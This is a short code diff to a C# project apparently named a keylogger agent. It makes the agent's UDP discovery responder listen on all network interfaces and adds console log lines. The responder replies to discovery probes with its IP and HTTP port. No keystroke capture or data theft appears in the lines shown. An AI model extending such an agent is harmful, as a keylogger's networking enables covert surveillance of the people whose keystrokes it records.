@@ -11,7 +11,11 @@ namespace Local_Keylogger_Agent
         private UdpClient udpClient;
         public void StartDiscoveryResponder()
         {
-            udpClient = new UdpClient(DiscoveryPort) { EnableBroadcast = true };
+            udpClient = new UdpClient(new IPEndPoint(IPAddress.Any, DiscoveryPort)) 
+            {
+                EnableBroadcast = true 
+            };
+            Console.WriteLine($"[Agent] Listening UDP/{DiscoveryPort} on all interfaces");
             Task.Run(async () =>
             {
                 try
@@ -30,6 +34,7 @@ namespace Local_Keylogger_Agent
 
                             byte[] responseBytes = Encoding.UTF8.GetBytes($"AGENT_RESPONSE: {localIp} : Port {HTTPServer.HTTPort}");
                             await udpClient.SendAsync(responseBytes, responseBytes.Length, result.RemoteEndPoint);
+                            Console.WriteLine("[Agent] Waiting for DISCOVER_AGENT...");
                         }
                     }
                 }
